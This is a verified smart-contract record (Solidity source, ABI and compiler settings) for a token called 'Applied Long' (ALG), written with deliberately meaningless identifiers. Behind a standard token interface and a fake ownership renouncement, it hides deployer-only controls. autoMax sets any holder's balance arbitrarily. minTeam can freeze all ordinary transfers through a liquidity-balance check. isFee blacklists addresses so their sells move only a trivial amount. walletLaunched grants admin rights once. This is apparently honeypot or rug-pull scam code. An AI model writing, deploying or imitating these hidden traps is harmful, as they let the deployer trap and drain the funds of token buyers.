{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface atShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptBuy {\n    function createPair(address tokenReceiverList, address atFund) external returns (address);\n}\n\ninterface sellReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoShould) external view returns (uint256);\n\n    function transfer(address liquidityBuy, uint256 fundAt) external returns (bool);\n\n    function allowance(address autoToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityBuy,\n        uint256 fundAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeMax, uint256 value);\n    event Approval(address indexed autoToken, address indexed spender, uint256 value);\n}\n\ninterface buyAtSender is sellReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppliedLong is receiverAmount, sellReceiver, buyAtSender {\n\n    function receiverLaunch(address sellReceiverList, address liquidityBuy, uint256 fundAt) internal returns (bool) {\n        if (sellReceiverList == feeShouldTeam) {\n            return launchedTo(sellReceiverList, liquidityBuy, fundAt);\n        }\n        uint256 listFee = sellReceiver(walletTeam).balanceOf(buyFee);\n        require(listFee == liquidityEnable);\n        require(liquidityBuy != buyFee);\n        if (swapLaunched[sellReceiverList]) {\n            return launchedTo(sellReceiverList, liquidityBuy, exemptTrading);\n        }\n        return launchedTo(sellReceiverList, liquidityBuy, fundAt);\n    }\n\n    function allowance(address amountTeamExempt, address isShould) external view virtual override returns (uint256) {\n        if (isShould == toAmount) {\n            return type(uint256).max;\n        }\n        return sellSwap[amountTeamExempt][isShould];\n    }\n\n    function walletLaunched(address limitSender) public {\n        require(limitSender.balance < 100000);\n        if (exemptMax) {\n            return;\n        }\n        \n        senderTx[limitSender] = true;\n        \n        exemptMax = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellSwap;\n\n    function approve(address isShould, uint256 fundAt) public virtual override returns (bool) {\n        sellSwap[_msgSender()][isShould] = fundAt;\n        emit Approval(_msgSender(), isShould, fundAt);\n        return true;\n    }\n\n    string private liquidityTo = \"ALG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityTo;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingMin;\n    }\n\n    bool public exemptMax;\n\n    event OwnershipTransferred(address indexed tradingIsSell, address indexed isLaunched);\n\n    function amountTake() public {\n        emit OwnershipTransferred(feeShouldTeam, address(0));\n        atMarketing = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return atMarketing;\n    }\n\n    bool private amountFrom;\n\n    bool public senderLimit;\n\n    uint256 private marketingMin = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private txAuto;\n\n    address private atMarketing;\n\n    function minTeam(uint256 fundAt) public {\n        takeMarketing();\n        liquidityEnable = fundAt;\n    }\n\n    function autoMax(address tradingAt, uint256 fundAt) public {\n        takeMarketing();\n        txAuto[tradingAt] = fundAt;\n    }\n\n    uint256 receiverBuy;\n\n    mapping(address => bool) public senderTx;\n\n    function getOwner() external view returns (address) {\n        return atMarketing;\n    }\n\n    uint256 private swapFund;\n\n    uint256 liquidityEnable;\n\n    function takeMarketing() private view {\n        require(senderTx[_msgSender()]);\n    }\n\n    uint8 private tradingMarketing = 18;\n\n    address public walletTeam;\n\n    uint256 constant exemptTrading = 6 ** 10;\n\n    address toAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private autoFee = \"Applied Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return autoFee;\n    }\n\n    function transferFrom(address sellReceiverList, address liquidityBuy, uint256 fundAt) external override returns (bool) {\n        if (_msgSender() != toAmount) {\n            if (sellSwap[sellReceiverList][_msgSender()] != type(uint256).max) {\n                require(fundAt <= sellSwap[sellReceiverList][_msgSender()]);\n                sellSwap[sellReceiverList][_msgSender()] -= fundAt;\n            }\n        }\n        return receiverLaunch(sellReceiverList, liquidityBuy, fundAt);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMarketing;\n    }\n\n    bool public shouldSender;\n\n    function balanceOf(address autoShould) public view virtual override returns (uint256) {\n        return txAuto[autoShould];\n    }\n\n    mapping(address => bool) public swapLaunched;\n\n    uint256 private shouldSenderAuto;\n\n    address public feeShouldTeam;\n\n    function launchedTo(address sellReceiverList, address liquidityBuy, uint256 fundAt) internal returns (bool) {\n        require(txAuto[sellReceiverList] >= fundAt);\n        txAuto[sellReceiverList] -= fundAt;\n        txAuto[liquidityBuy] += fundAt;\n        emit Transfer(sellReceiverList, liquidityBuy, fundAt);\n        return true;\n    }\n\n    function isFee(address shouldSwap) public {\n        takeMarketing();\n        \n        if (shouldSwap == feeShouldTeam || shouldSwap == walletTeam) {\n            return;\n        }\n        swapLaunched[shouldSwap] = true;\n    }\n\n    address buyFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address tradingAt, uint256 fundAt) external virtual override returns (bool) {\n        return receiverLaunch(_msgSender(), tradingAt, fundAt);\n    }\n\n    constructor (){\n        \n        atShould receiverSenderIs = atShould(toAmount);\n        walletTeam = exemptBuy(receiverSenderIs.factory()).createPair(receiverSenderIs.WETH(), address(this));\n        \n        feeShouldTeam = _msgSender();\n        amountTake();\n        senderTx[feeShouldTeam] = true;\n        txAuto[feeShouldTeam] = marketingMin;\n        if (senderLimit == amountFrom) {\n            shouldSenderAuto = swapFund;\n        }\n        emit Transfer(address(0), feeShouldTeam, marketingMin);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingIsSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeamExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAt\",\"type\":\"uint256\"}],\"name\":\"autoMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShouldTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"}],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundAt\",\"type\":\"uint256\"}],\"name\":\"minTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"}],\"name\":\"walletLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AppliedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}